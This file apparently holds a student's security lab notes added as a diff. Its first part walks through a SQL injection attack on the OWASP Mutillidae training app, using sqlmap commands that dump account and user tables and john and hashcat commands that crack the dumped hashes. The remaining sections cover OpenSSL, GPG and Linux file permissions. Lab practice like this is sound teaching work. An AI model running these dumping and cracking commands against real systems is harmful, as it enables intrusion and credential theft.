@@ -1,0 +1,109 @@
+SQL Injection Attack
+Start OWASP BWA VM → Get IP using ifconfig → Note the IP (e.g., 192.168.1.100)
+Open Kali Linux → Launch Firefox → Go to http://192.168.1.100 → Click "OWASP Mutillidae II"
+Navigate in Mutillidae: OWASP 2013 → A1 Injection (SQL) → SQLMAP Practice → View Someone’s Blog → Choose username → Click "View Blog Entries"
+Open BurpSuite CE → Enable Intercept → Submit form in browser → Copy POST request → Save as sql_request.txt → Turn Intercept OFF
+Commands:
+
+sqlmap -r sql_request.txt -D mutillidae --tables
+sqlmap -r sql_request.txt -D mutillidae -T accounts --dump
+grep "Referer" sql_request.txt | awk '{print $2}'
+grep "author" sql_request.txt
+grep "Cookie" sql_request.txt | sed 's/Cookie: //'
+sqlmap -u "http://192.168.1.100/mutillidae/index.php?page=view-blog-entries.php" --data="author=jeremy" --cookie="PHPSESSID=abcdef1234567890; security=low" --dbs
+sqlmap -u "http://192.168.1.100/mutillidae/index.php?page=view-blog-entries.php" --data="author=jeremy" --cookie="PHPSESSID=abcdef1234567890; security=low" -D mutillidae --tables
+sqlmap -u "http://192.168.1.100/mutillidae/index.php?page=view-blog-entries.php" --data="author=jeremy" --cookie="PHPSESSID=abcdef1234567890; security=low" -D mutillidae -T accounts --dump
+sqlmap -u "http://192.168.1.100/mutillidae/index.php?page=view-blog-entries.php" --data="author=jeremy" --cookie="PHPSESSID=abcdef1234567890; security=low" -D mutillidae -T users --dump
+cat dumped_data.txt | awk '{print $4}' > hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+SSL
+openssl version
+openssl version -a
+openssl genrsa -out yourdomain.key 2048
+openssl genpkey -out fd.key -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -aes-128-cbc
+cat yourdomain.key
+openssl rsa -text -in yourdomain.key -noout
+openssl rsa -in yourdomain.key -pubout -out yourdomain_public.key
+cat yourdomain_public.key
+openssl req -new -key yourdomain.key -out yourdomain.csr
+cat yourdomain.csr
+openssl req -new -config fd.cnf -key fd.key -out fd.csr
+cat fd.csr
+openssl req -new -key yourdomain.key -out yourdomain.csr -subj "/C=US/ST=Utah/L=Lehi/O=Your Company, Inc./OU=IT/CN=yourdomain.com"
+openssl req -text -in yourdomain.csr -noout -verify
+openssl x509 -req -days 365 -in fd.csr -signkey fd.key -out fd.crt
+cat fd.crt
+openssl x509 -text -in yourdomain.crt -noout
+openssl pkcs12 -export -name "yourdomain-digicert-(expiration date)" -out yourdomain.pfx -inkey yourdomain.key -in yourdomain.crt
+openssl pkey -pubout -in ./private.key | openssl sha256
+openssl req -pubkey -in ./request.csr -noout | openssl sha256
+openssl x509 -pubkey -in ./certificate.crt -noout | openssl sha256
+
+
+Cloud - GPG
+gpg --delete-secret-keys your_email@example.com
+gpg --delete-keys your_email@example.com
+sudo apt-get install gnupg
+gpg --gen-key
+gpg --output ~/revocation.crt --gen-revoke your_email@example.com
+chmod 600 ~/revocation.crt
+gpg --output ~/mygpg.key --armor --export your_email@example.com
+cat mygpg.key
+gpg --import mygpg.key
+gpg --fingerprint recipient_email@example.com
+gpg --sign-key recipient_email@example.com
+gpg --output ~/signed.key --export --armor recipient_email@example.com
+nano message.txt
+cat message.txt
+gpg --encrypt --sign --armor -r recipient_email@example.com message.txt
+gpg message.txt.asc
+cat message1.txt
+cat message.txt.asc
+gpg --list-keys
+gpg --refresh-keys
+gpg --import revocation.crt
+gpg --keyserver pgp.mit.edu --send-keys key_ID
+gpg --send-keys --keyserver keyserver.ubuntu.com key_ID
+
+
+
+
+
+
+RBAC
+sudo useradd -m user_1
+sudo useradd -m user_2
+sudo addgroup new_group
+sudo adduser user_1 new_group
+sudo adduser user_2 new_group
+sudo su - user_1
+nano file.txt
+cat file.txt
+ls -l
+chmod o-r file.txt
+ls -l
+exit
+sudo su - user_2
+cd ..
+cd user_1
+ls -l
+cat file.txt
+exit
+sudo chgrp new_group /home/user_1/file.txt
+sudo su - user_2
+cd ..
+cd user_1
+cat file.txt
+ls -l
+exit
+
+
+
+
+
+
+
+
+
